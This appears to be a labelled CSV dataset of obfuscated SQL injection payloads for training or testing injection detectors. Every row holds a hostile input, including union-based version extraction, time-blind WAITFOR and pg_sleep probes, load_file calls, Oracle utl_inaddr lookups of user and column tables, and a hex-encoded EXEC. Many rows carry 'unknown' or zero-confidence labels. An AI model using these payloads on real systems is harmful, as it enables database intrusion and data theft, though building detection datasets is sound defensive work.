payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
""" OR, pg_sleeP ;( \__time__ ;):@ or )""0b110b0o7x0O2""/*S7BO?oJWuJ}IF*RI*/likE ""8B2o7Z"" or ""KDe""<>""kDe"" &&:(SelECT (sELEct?0O7x0298))~NOT lIKe (seLect 0O4b0b1110101100010002010800001010001101001111)/*WB|Wa !vhH0B1000m[}PFw Q in3wB8u*/ && ""q=wC""'lIke]""q=WC""~oR ""d*} OR-0b0o0 or`=FaLSE* oR FALsE OR ""M)3""!=""M)3"" oR fAlse<or ""W?3p"" NoT LIke ""w?3p""#"" noT liKe ""D*}#""^--0X6::r0x5T RC}SK",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"&& & (seleCt 0x3) lIKe utL_INaddr.get_hOst_AddRESS ^( /*(SeleCt (select (sELecT (sELeCT (SElecT (seLeCT (SELECT 5))))))).*/ (] sElECt diStINCt` (/**/ TABlE_NAME )[ fROm /*;=AtU0*/ ( seLecT`dIstiNCt@`( taBle_NAmE/ ) , rOwnum(aS LiMIt FROM sYS.aLl_tAbLES ) /wHEre limIt +LiKE 2o2 ;)* - ) ] anD 'i'='i",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"1; _(_.lOad_file ( chAr (=)0X2f,(SElEct 101),(seLeCT 0x9c),(sELeCt 93),0x11,0o0xA0,(seLeCT (SElEcT 0o0o215)),(seLEcT 115),0x0x73,0X4X71,0O0o220 ) ;/*./?J @>u,d6~'wp*/ ), . ) },(selEct 9),0O1,(SELECT (SeLecT 1));",out_of_band,mysql,case_variation|comment_whitespace|inline_comment,0.4,rule,sqliv5_json,unknown
))= Or~|.:(._'a' :=!/*0o2B0o0x6X0B0o6b111111101 Ra!}}*/'A,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"ADMIn' oR$0X1 !=* (SElECT (selEct (sEleCt 1))) and 0x1eF IN;(0X1EE,(sElECT 0X0x7X1eF),(SElEct (seLEcT/*HaF0Y*/0b111120050))) && ""K""=""K"":aND`TRue oR FALse and trUe#lU",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"{SeleCt *`fRoM\USeRS;wHERe|iD =/*X'v/|)6;:*/ 0b2x8 oR "" =( +]""\ OR`""0X0x5X3 =[,0o0O0x0O2B9x0o30~Or ""G)""=NOT -liKe; ""g)""~&& ""re`"" not liKE ""rE`&oR 7X0O0*or FalSE oR False && truE anD (SELECT (seLecT (SELECT 1)))#"" --}8o1fLvq&@D;7",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"}anD 0x0o0B0o0o0b0b101010011010100001101100B9` < liKe `Utl_InaddR.Get_HosT_AddREss *( ; (/*;>m{*/ SeleCt~distIncT ( CoLuMn_naMe ) <~From}+ ( SElEcT DisTincT (/*UA bF_ZJG2""WDd*/ ColUMN_NAme [) , rOwnUM As liMit'fROm ALl_tAB_cOLUmNs%*) WHerE LimIt liKe (seLect[6x0b0b0X16c924) ) )( $ aNd''I' LIke ;'I",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"sELeCT * FROM uSers WHERe iD = )'2x2' %!<@ <oR ^ fALSe*Or/*<*/FalSe }oR ""It""~not lIKe ""iT"" or|faLSe anD`TRuE Or '*SM' NOT LIKE '*SM' And tRUE AnD (sELECT (SELECT 0x1)) or faLse AND (SELECT 0x1) OR False#OR (SELECT (SELECT 0))#UNion SEleCT_5X0o0o2x5,VersION^ (\'; ) {-- 9'm0B101vt0o0b11@ns",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"sELECt *""frOM}usErs WHEre ID/*[Y;0b101?XqVm lE*/= '0b101' * `( \ ) oR 6X0O3 LIkE (SELeCt (SeLEct 1)) oR FaLSe or faLSe and tRUE oR 'te'!='TE' -- 5'~JQ",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"1 ANd aSciI ( LoweR (< sUbsTrInG/*wMHbn(:P! 6*/ ( ( sELECt toP (SELECT 1) NaME FroM SYSObjeCts wHERE XTYPE liKE 'U' ) , (SELECT 1), 1 ) ) ) > 136",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
SELect`*/**/fROm usErs wHerE_ID LiKe= 0B9b1~or \.<\ Or 5X0b0o1 liKe?8B1;OR faLSE OR FALsE --+4K>I<0x1J,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"^sELect * FrOm USers[whErE,ID{ Or FaLSe aND tRUE AND (SELECT 1) OR False#={`0X3 or((Select 1x9) and/*S*/' v0B1001' nOT lIKe ' V0b1051M'#OR@FalSe &&/*!#(SELECT{(SelecT (SELecT (SeLEcT (SELECT 0)))))*/ 0X70cF<>0X10CE#""?;LiKE$0o0b0X1<|| 2X7 = +5x1?--""1X1m;?d*k]y",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SeleCt * FroM`useRs&WhEre Id =/**/ (seLecT^1)|Or ""%?"" oR 0o6=(SELECT 1)?-- 05",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sELecT * FrOm*usErs wHerE Id ={ (selecT 0X6) OR'""? /**/ && ` truE OR (SELECT 0) oR`FaLSe and tRUE AND 1838 NOT LIKE (SELECT (SELECT 1849))#""_oR 0x8 =_[5X9*-- 6o4IJ=xP6@",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"/*|A|e</DXfY0O0o7U96Y~*/Or}(seLECT)0X2), ~=!*)0B0X0O0b7O4B18",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SElecT * FroM uSErs wheRE ID{ like ""(SELECT 0X3) OR "".& (/**/.""]OR 0x0X6 like!(SELecT (SelEcT (SELECT 1))) &&^""v""!=""vu"" aND TRUE oR '!'='!N' oR FAlse Or fAlSe ANd TrUe --]0X5o2Xre",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"SeLect * FroM>UseRs wHEre^Id lIKE '7' unIon Select OR /(SELeCt 8),veRSIoN ( ) /*Mk~yoL*/or (SeLeCT 0X0o0) Or fALSe && ""qht)""=""qHT)"" OR (seLecT 0x13b1) NOT LIke (SElEct (selECT (SElECt 6046))) AnD tRuE anD TRuE --(9'x\BXK",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"selEct * FroM/*~;y*/USeRs!wheRe;Id LIKE (seleCt (seleCt (SELECT 9))) <@&@ uNION SELeCt 0o7,VeRSIon () ) anD!(SEleCT (seLect 1))< AnD 'd""O'='D""o' anD 1 or 9883 NoT LIkE 0x25d3 or false -- 0X0o1;?Qw",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.7,rule,sqliv5_json,unknown
"=SELecT\*,fRom uSERs WHeRE>Id~lIKE?'4'/*){N;aH2Dxed>*/uNion.sELecT{$*$,@@VERsIOn/* E.@jdf/lOjm8ZJq+] Z;kxa*/aND_TRUe$&&,trUe<-- 0x0b0O0b1010o2O0o7'`.7B1271",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1;}/*g5TdXMZ [ oR 0b0#u*/( Load_fIle<<(! cHAr ( ;8x2f,(sEleCT 8B1100101),0O0XA1,90,0X2f,(SELECT 118),0o0X0B0b11011000111111101,(selEcT:0b1111310100),/**/...]Jq",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"seLect *?FRoM$UsErS WHerE iD LiKE *'0o0b1'~or+$ (sELect (SELECT 1)) =_ 0x0x9=UNIon selEcT (seleCt`(SelECT@1)),@@versIon OR 0O0x0/*4hxTNF?TYZ*/ Or %(selecT (SeLect (SELECT 3004)))? LIke (selecT 0xbD0x5O3) or false? Or FalSe or ""[]"" not = ""[]"" OR False -- 9o2'S #l~5f",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_double_quote
"-SelEct/* t(4VS9LIZ]'{ S*/* FroM uSErS whERe ID =('4o0O0x1'-or \<\-UNion SeLeCt (SElECT.(sELECT (SelEcT (sElECt (SELeCT 3))))),@@VERSioN && TRUe{ oR\ (Select 0x0) )Or 'E' NoT = 'E' oR fALSe OR (selecT 0) aND 1 OR False -- 4'JH:gj",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,numeric
"select *-fRom UsErS WHerE/**/Id likE (sElEct (seLecT (SELECT 1)))-Or ""$["" Or:0B0b0x1 liKe (SelEct (SelEcT (seLECT 0x0)))`anD True]Or 6X169 != 0X1af&&truE anD TrUE || (SELECT 0) --}0X1E!",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sELeCt * From uSErs wHeRe iD LIKE (SeleCT (SElEcT (SelecT-0x1))) + ( 0x3 ) UnIOn SEleCt|null,bANNER from V$vErsIoN wHere ROwNum =/*MO*/ (SelEct 0x0) -- 0O5o4o10`t",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
9B1/*B5u1\<*Kw^x09*/ OR-[pg_SlEep }([ __time__(_)$'!oR(\7b0b1010x9b0b0O0o0b0b8O1x19CX0)--,unknown,unknown,inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"SelEct */**/FrOm useRs WHERe id %LiKe (SeleCt (SELecT](sElECT 0O1))) OR "", or 0x0 AnD (seleCT (SELECT (SELECT 1))) aND tRuE OR fAlSe#"" oR 0o1 lIke 0b4X0O0B0 -- 2Z:nA 8",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"aDMiN'?@) -/or@_-(/""'0X2x4'{/*C,0b0o9x1o0xBo0X8qB|RzX0x2Y0X0b0b1051.akYx0B0B110l`Z@J~ke iB0B0O144h|rTM7I0}P5hq"";3?rKC*/ +=+>` `'3x3X0o1B0b134'/*",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElECt * fRom USerS WHERE/**/Id Like 0X9 UNiON select 1,bANnER FROM v$vErsion WHerE RoWnum LIkE (SELECT 1) oR FAlse or falSe OR FALSE -- 1RE",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"""/*HZ(;:0b101005GYpE&*/oR 9o19 =[9X0x0b0X0*or=FAlsE+^=or . 0O0X195""NOt$ LIKe& 0X194#--9g",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"(SELeCT * fRoM(uSerS wHERe'ID=0O0o6 UniON}sELECT/**/@`$_,VeRsIoN *(. ; )+<_OR '7'='7o7b7X6X0o1762C'{Or$FaLsE --}0xbgnx5?]",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
SELEct * froM UsErs`wheRe id/*:*/= 5o8 <@.$ or 8 =`(selEcT 1) or FaLse oR^FALsE -- (sELect 0x1) `{P,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"/* X9**/select * FRom USErs_wHeRE ID = 0X0b1 + $+*$ uNioN SeLecT NULL,@@VErSIoN Or fAlse Or 0x0 OR (seLEct (seLECT (SeleCT 9105)))=0X23BE oR FALsE aND (sELeCT (SelECt 1)) Or FAlSE --`0i",union_based,mssql,case_variation|inline_comment,0.46,rule,sqliv5_json,unknown
"selEcT * FROm<USerS wHERe id ;= (SELeCT (SElECt 1)); OR "",."" or 0x0o1/**/ LIkE 1 -- 4m",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SEleCt * fROM USerS<wHEre iD ;= 0O0X3 Or ""1&"" OR*(seLECt 0)+ && 1 && (sELeCt 1) Or fALSE#likE (SeLeCt (SeLEcT 0O1)) AND ""M"" NoT/* 3o:j*/lIke ""m"""" anD}945|Not lIKE 0O0X6b2 And TruE|AND ""`"" not LIkE ""`b"" And tRUE{ OR (seLECt (Select 6X9)):&& ""ujoR""{nOT LIke ""UJor]"":OR 7980 NoT lIkE 0X1F36 OR 7 oR FaLSe;-- 0# oy<jJ",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"dEclare[@S/*0x216*/VaRcHAR `( $(SeLECt 0B2X0x0B111D909a3)`&) SelECt @s> ;LikE ,-2O0O0o0X0b10010101101110000C6<...",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"||/*+ L(0x5i[g*/9X6o0 '={'4X0B0-#""0n3i`(sELEct?(selECT (SeLEct+(seLeCt (SELEcT (SELECT 1))))))</'^",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElECT * FRoM|uSErS WheRe Id Like 0x1 or "".]""/**/oR 0b1=(SElect (SeLect 6))+AND (seLect (sELEct (SELEct 0x1))) -- 0A iG",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"^ ),~& Or/*px *NrE1o0b1001b0o0o0o6$3AF)W^:=}JCOa3:^oc*/ $@(}~&&+.'x' ~liKe.['x",unknown,unknown,inline_comment,0.0,rule,sqliv5_json,unknown
"seLeCt * froM UsERs wHErE ID LIKE ;0x3X1.<@$ UniOn seLect (sELECT)(SELECT (SELECT 6x5))),VersION ( /**/ ) aNd '['='['(oR{fAlse OR fAlSe or 0b1001x0;-- 0B1|8:",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.7,rule,sqliv5_json,unknown
$ &(+/*p)|*/slEEP (SelEct`0X0O0b0B3300170X25) !)<,unknown,mysql,case_variation|comment_whitespace|inline_comment,0.05,rule,sqliv5_json,unknown
"1/*)Vrpr3NPK*/unIon AlL sELEct (SeLEct 0o1),(sElEcT}(select 2)),0x3,(SELeCt 1),(SEleCt 0b851),0X2,NAME FRom sySObjeCts WhEre`xTYpE ?likE And truE Or '&M('='&M(6' aND+TrUe;Or (SeLect (seLEcT 0)) ANd tRUe or<falsE oR FaLSE and 1 And trUe# 'U' OR 0x1O0O0b0b0'--0X9ENlbnh@%:",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.7,rule,sqliv5_json,string_single_quote
"sELECT * FrOM USErs whErE iD LIkE ;0o0o10X3 oR (SELECT 8) Or fALSe OR&(SELECT 0) OR False#""; UnIoN select NULL,VERSIoN ( ) --/**/3B%[p""}<",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"&& 0B0B0O0B110x0X2b2x0X5b0b100010110100101110111 liKe utl_iNaddR.GeT_Host_aDdrEsS/*BM*/& (]/* 5JTph_K*/ )( ?select%DiSTinCt ( colUmn_nAMe )+ fROm ( +sElECT DIsTiNcT?-( [cOLUmN_NaMe +) , ROWnuM aS:lImIt froM!ALl_taB_ColumnS? ) ?(WHere lIMIT lIkE 0b0o145x0x9o0X0o0O0x5~ `): /**/ )|> and'i'<LiKe 'i",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"0B2B7O0o0b81B100 ANd&uSEr_name `(, ) /*( `(*/ [= 'dbO'",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"; If noT ( sUbSTring ( ( seLEct @@VERsion/**/ ) ,0O0B100101,(SelECT 4) ) <> (selecT 0x1)?=) WAITfor DeLAy '5:(SELECT 0):2' aND true AND 1310<>(SELECT (SELECT 1311)) --",time_blind,mssql,case_variation|comment_whitespace|inline_comment,0.51,rule,sqliv5_json,unknown
"sELECT *'fROM uSeRS wHere iD LiKE 0X1X6 oR (SeLEct 0X1) aNd: 0x3b0 nOt LikE (selecT (Select (sEleCt (SeLeCT (SelEcT (sELeCT (sELEcT 781))))))) And tRue aNd ""m""!=""m,"" aND tRUE/**/And 9x1 anD (SELECt 1) Or 'Q '!='Q ' Or fAlSE#""$ UNIoN/*&kE.]*RI`*/sELecT (SElEcT (SeLecT 0x0X2)),verSIon ( ) [:-- 3Prx",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SeLecT * FroM USErS wHERE!ID lIkE (SElect (SelECt 0X0)) oR 0x1 and (SELECt (SELECT (SELECT 1)))#""{~uNioN SeleCT NuLl,vErsIoN ( + ,)/**/ --/**/0x4uzS",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
seLeCt * FroM UsErS wHere iD = '2'[*$ ./*yB>e)(SELECT 0)`EnV'XX&*/OR (select (SelecT (sElect 1))) liKe *(SeleCt 1x1)^-- 0X0b1'2@fw,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
SelEct * frOm UseRs/**/WHere ID\ LIkE ; 0X0B1 +$+. or (seleCT$(SELECt 6)) = 0O1 OR FALSe AnD 5055 nOT LIke 5056 oR FalsE -- 1],unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"<And 0o0O4O0x0o2X0o6o10=UTl_iNaDdr.GET_HOSt_aDdRess ( [ ( SELeCT Distinct (< useRnAME ) FRom \ (<?selecT;diSTiNCt< ( uSERnAmE ) &, roWnum AS LimiT FRom[SYs.all_UseRS ) *WHEre lImiT liKE/ 0B0O4X0O0o5, ) /*F? jWGJo{BhxKb/i*/ )` + && 'I'+ lIKe 'I",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"sELECT * FROm+userS`wHErE Id =\ 0b6B9b1 "">{oR 0x6b8 LiKe 0b4o0X8 And{true or 'Jx' Not LiKe 'jx' &&/*(@rL+<MUL<(~30S cek5VDey*/(TRue{ OR FaLsE|OR FAlSE Or FAlse Or ""s$S0""*noT]LIke ""S$s0O7O0"" AND\true<AnD ""Rs""=""Rs"" aND TruE oR ' L;`9' nOT LIKe ' l;`9' oR FaLsE anD TRuE AND trUE && TRUE OR ""HeeO""!=""HeeO"" -- 0o0x9O3b1\b",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
>{OR +/*A5b5x6~K4o0o0b5b1100100hQ cT E7*/'teXT' > 't',unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0B10011001110 ""! AnD: 0x0o0O9O1/** X0x6cCJiP*/ lIkE/*(sELECT 76)*/ (SELeCt (SeleCt:0X9)) unIoN All select/""ADMin"", ""81dc9bDB52D4dc24036DbD8313ED965",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
";seleCT * from USErs WHere/*B Z|(SELECT (SELECT 1))*/ID = 0B0 Or ""%["">or!'j,V'='J,V' ANd (SeLECt (sELECt 0X1)) oR FalSE Or FaLSe --/**/3",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sEleCt */**/fRoM usErs wHeRE Id LIKE (select 0O0B1001) or (sELEct 1) aNd TRUe Or faLSe OR fALSe OR ""&!J&"" nOt lIkE ""&!j&"" AND True#""; } liKE. (SelecT (SElecT 0x1)) UNIon/**/SELecT 0O1,verSIon %( ) * -- 5W=",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
": And 0o0o0X0x3o0O9 like ; ? }utl_iNadDr.Get_hosT_ADDrEss, {(_ ({ ,SelEct diSTINcT` ( usernaMe .) FrOm ( ?SELect dISTINCt (` uSERnamE ) ?, rOWnuM aS LImIT frOm SYS.AlL_Users ) WHErE~LiMIt lIKe; 0o0O3b0o1o0B1011o0O9o31 )] ) anD 'i'/*oH(uT<Q}y[RwpV*/:lIKe 'i",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.06,rule,sqliv5_json,unknown
"seLECT;* FRom`UsErs WHeRE ID;= 0o11o0X1:or ""$&""`OR (seLEcT 0B4)/*} ""*/=`(sELeCt 0b1000)[ANd trUe --+0O0o0o5x0x1@/",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"0O0O0B4B0B0o1550/*p.z_qf-1XKZ1G_*/? )/*|*/ )) ;,} or[ Pg_slEep ](/*R (SelECT (selEct (SELECT 7)))*/ __tIMe__ ) or (seleCT 7X14a0b1001) lIKe 0b1061010101010 Or*False --",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"""sELEcT * FRoM UseRs wHErE iD *= '2' uNIOn/* EO */SELEct !<@,VErsiOn^ ( - ) and ~ 0XC25!=(SELECT (sELEcT (sElect[0X0B10111Bd))) or ""SP"" liKe ""spA"" and ""3x8}"" Not liKe ""8}\"" or faLSe anD*""im"" NOt lIKE ""imj"" or fALSe aNd ""g""<>""gy"" OR faLse oR fAlsE oR falSE aND true -- 1'`?S+",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
Or 0X4b0b0B1/**/= (SElECT?(seleCT (SELECT (SELECT 1)))) OR '' ;=} ',unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
DECLARE/**/@Q NvaRChaR ( 0xC8 ) ]SeLEcT @Q/**/ /**/ LiKE/**/ 0x0b1010011011111010111110010001011101000101110010001111011000101011010110F0072002000640065006C00610079005000270030003A0030003a0031003000270000 exec ( @q^ ),unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
")SeLecT * fROM usErS%WhErE iD, lIKE (SElecT (SELECT 1)) oR)""]0x0O3o1""+oR:(seLECt (SEleCt`(sELECt 1))) /**/LIkE"" 0x6 or_ ""V6T"" LIke ""v7tO""+-- 1R pE",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"seLeCt}* fRoM!USeRS whErE Id ?, lIkE 0B0X1B9X1 or $+<(SELect 0x1) uniON seLeCt (SeLEcT (SelecT (selECT 1))),@@veRSION?%or/**/-0X0 and TRUE||0x9B3B20 <> (sELEct (SELECt 2482))=aNd TrUE AnD 0X1 aNd tRUe OR False --@4o7Uh@[",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
